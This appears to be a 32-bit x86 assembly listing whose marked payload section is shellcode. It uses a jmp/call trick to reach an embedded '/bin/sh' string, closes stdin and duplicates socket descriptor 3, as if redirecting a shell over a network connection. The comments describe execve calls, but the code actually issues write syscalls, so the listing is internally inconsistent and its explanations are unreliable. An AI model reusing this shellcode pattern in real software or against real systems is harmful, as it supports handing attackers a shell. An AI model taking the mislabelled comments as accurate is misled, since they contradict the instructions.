.file	"test.c"
	.text
.globl function
	.type	function, @function
function:
	pushl	%ebp
	movl	%esp, %ebp


	#PAYLOAD_START

	jmp L1				# Jumping to L1
	L2: 				

	xorl %eax, %eax			# Setting eax to 0

	#closing stdin
	xor %ebx, %ebx
	movb $0x1, %bl
	movb $0x6, %al			# Setting eax to 6 (close)
	int $0x80

	#duplicating socket

	movb $0x3, %bl			# setting dup arg to socket
	movb $0x29, %al
	int $0x80	

	movb $0x29, %al	
	int $0x80

	movb $0x29, %al	
	int $0x80

	xorl %eax, %eax
	xorl %ebx, %ebx
	xorl %edx, %edx
	popl %esi

	xorl	$0x7, %edx		# NULL in %edx
	movl	%esi, %ecx		# Address of array in %ecx
	movl	$0x1, %ebx		# Address of /bin/sh in %ebx
	movb	$0x4, %al		# Set up for execve call in %eax
	int	$0x80			# Jump to kernel mode

	xorl	$0x7, %edx		# NULL in %edx
	movl	%esi, %ecx		# Address of array in %ecx
	movl	$0x4, %ebx		# Address of /bin/sh in %ebx
	movb	$0x4, %al		# Set up for execve call in %eax
	int	$0x80			# Jump to kernel mode

	movb $0x1, %al
	int	$0x80

	L1: call L2
	.string "/bin/sh"

	#PAYLOAD_END

	popl	%ebp
	ret
	.size	function, .-function
.globl main
	.type	main, @function
main:
	pushl	%ebp
	movl	%esp, %ebp
	call	function
	movl	$0, %eax
	popl	%ebp
	ret
	.size	main, .-main
	.ident	"GCC: (GNU) 4.4.7 20120313 (Red Hat 4.4.7-17)"
	.section	.note.GNU-stack,"",@progbits
